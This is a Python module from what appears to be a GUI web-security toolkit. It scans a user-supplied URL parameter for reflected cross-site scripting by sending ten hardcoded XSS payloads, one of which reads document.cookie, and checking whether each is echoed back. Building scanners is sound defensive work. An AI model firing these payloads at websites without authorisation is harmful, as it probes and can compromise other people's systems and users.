# modules/xss.py
import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, unquote

class XSS:
    def __init__(self, tab, app):
        self.app = app
        self.running = False
        self.stop_flag = False
        self.create_widgets(tab)
        
    def create_widgets(self, tab):
        tab.grid_columnconfigure(0, weight=1)
        tab.grid_rowconfigure(2, weight=1)
        
        setting_frame = ctk.CTkFrame(tab, corner_radius=10, fg_color="#1a1a2e")
        setting_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        setting_frame.grid_columnconfigure(1, weight=1)
        
        ctk.CTkLabel(setting_frame, text="🎯 Target URL:", font=ctk.CTkFont(size=12)).grid(row=0, column=0, padx=5, pady=5)
        self.url_entry = ctk.CTkEntry(setting_frame, placeholder_text="http://example.com/search.php?q=test", height=30)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        ctk.CTkLabel(setting_frame, text="📝 Parameter:", font=ctk.CTkFont(size=12)).grid(row=1, column=0, padx=5, pady=5)
        self.param_entry = ctk.CTkEntry(setting_frame, placeholder_text="q", height=30)
        self.param_entry.insert(0, "q")
        self.param_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        
        self.progress_bar = ctk.CTkProgressBar(setting_frame, height=18)
        self.progress_bar.grid(row=2, column=0, padx=5, pady=5, columnspan=2)
        self.progress_bar.set(0)
        
        self.log = ctk.CTkTextbox(tab, wrap="word", state="disabled", font=ctk.CTkFont(size=11), fg_color="#0a0a1a")
        self.log.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
        
        btn_frame = ctk.CTkFrame(tab, fg_color="transparent")
        btn_frame.grid(row=3, column=0, padx=10, pady=10)
        
        self.start_btn = ctk.CTkButton(btn_frame, text="▶ Start", command=self.start_scan,
                                      fg_color="#2ecc71", hover_color="#27ae60", height=35, width=100,
                                      font=ctk.CTkFont(weight="bold"))
        self.start_btn.pack(side=ctk.LEFT, padx=5)
        
        self.stop_btn = ctk.CTkButton(btn_frame, text="⏹ Stop", command=self.stop_scan,
                                     fg_color="#e74c3c", hover_color="#c0392b", height=35, width=80,
                                     state=ctk.DISABLED)
        self.stop_btn.pack(side=ctk.LEFT, padx=5)
        
        ctk.CTkButton(btn_frame, text="💾 Save", command=self.save_log,
                     fg_color="#3498db", hover_color="#2980b9", height=30, width=80).pack(side=ctk.LEFT, padx=5)
        ctk.CTkButton(btn_frame, text="🗑️ Clear", command=self.clear_log,
                     fg_color="#95a5a6", hover_color="#7f8c8d", height=30, width=70).pack(side=ctk.LEFT, padx=5)
    
    def log_to_widget(self, msg):
        self.log.configure(state="normal")
        self.log.insert(ctk.END, msg + "\n")
        self.log.see(ctk.END)
        self.log.configure(state="disabled")
    
    def clear_log(self):
        self.log.configure(state="normal")
        self.log.delete("1.0", ctk.END)
        self.log.configure(state="disabled")
    
    def save_log(self):
        content = self.log.get("1.0", ctk.END)
        filename = f"xss_log_{int(time.time())}.txt"
        with open(filename, "w") as f:
            f.write(content)
        messagebox.showinfo("Saved", f"Log saved to {filename}")
    
    def start_scan(self):
        if not self.url_entry.get():
            messagebox.showerror("Error", "Please enter target URL")
            return
        
        self.running = True
        self.stop_flag = False
        self.start_btn.configure(state=ctk.DISABLED)
        self.stop_btn.configure(state=ctk.NORMAL)
        self.progress_bar.set(0)
        self.clear_log()
        self.log_to_widget("[*] Starting XSS Hunter")
        self.app.set_status("XSS scan started...")
        
        threading.Thread(target=self._scan_thread, daemon=True).start()
    
    def _scan_thread(self):
        try:
            url = self.url_entry.get()
            param = self.param_entry.get()
            proxies = self.app.get_proxy() if hasattr(self.app, 'get_proxy') else None
            
            payloads = [
                "<script>alert(1)</script>", 
                "javascript:alert(1)",
                "<img src=x onerror=alert(1)>",
                "';alert(1);//",
                "\"><script>alert(1)</script>",
                "<svg onload=alert(1)>",
                "onerror=alert(1)",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<script>alert(document.cookie)</script>"
            ]
            
            self.log_to_widget(f"[*] Target: {url}")
            self.log_to_widget(f"[*] Parameter: {param}")
            self.log_to_widget(f"[*] Payloads: {len(payloads)}")
            self.log_to_widget("-" * 50)
            
            found = False
            
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = parse_qs(parsed.query)
            
            for i, payload in enumerate(payloads):
                if self.stop_flag: break
                params[param] = payload
                test_url = f"{base}?{urlencode(params, doseq=True)}"
                
                try:
                    r = requests.get(test_url, timeout=5, proxies=proxies)
                    content = r.text.lower()
                    
                    if payload.lower() in content or unquote(payload).lower() in content:
                        found = True
                        self.log_to_widget(f"[!] XSS found: {payload}")
                        self.app.vulnerabilities.append({
                            'title': 'XSS Vulnerability Detected',
                            'description': f'URL: {test_url}\nPayload: {payload}',
                            'severity': 'High',
                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                        })
                except:
                    pass
                progress = i / len(payloads)
                self.progress_bar.set(progress)
            
            self.log_to_widget("-" * 50)
            if found:
                self.log_to_widget("[!] XSS detected!")
            else:
                self.log_to_widget("[*] No XSS found")
            
        except Exception as e:
            self.log_to_widget(f"[!] Error: {e}")
        finally:
            self.running = False
            self.start_btn.configure(state=ctk.NORMAL)
            self.stop_btn.configure(state=ctk.DISABLED)
            self.progress_bar.set(1.0)
            self.app.set_status("XSS scan finished")
    
    def stop_scan(self):
        self.stop_flag = True
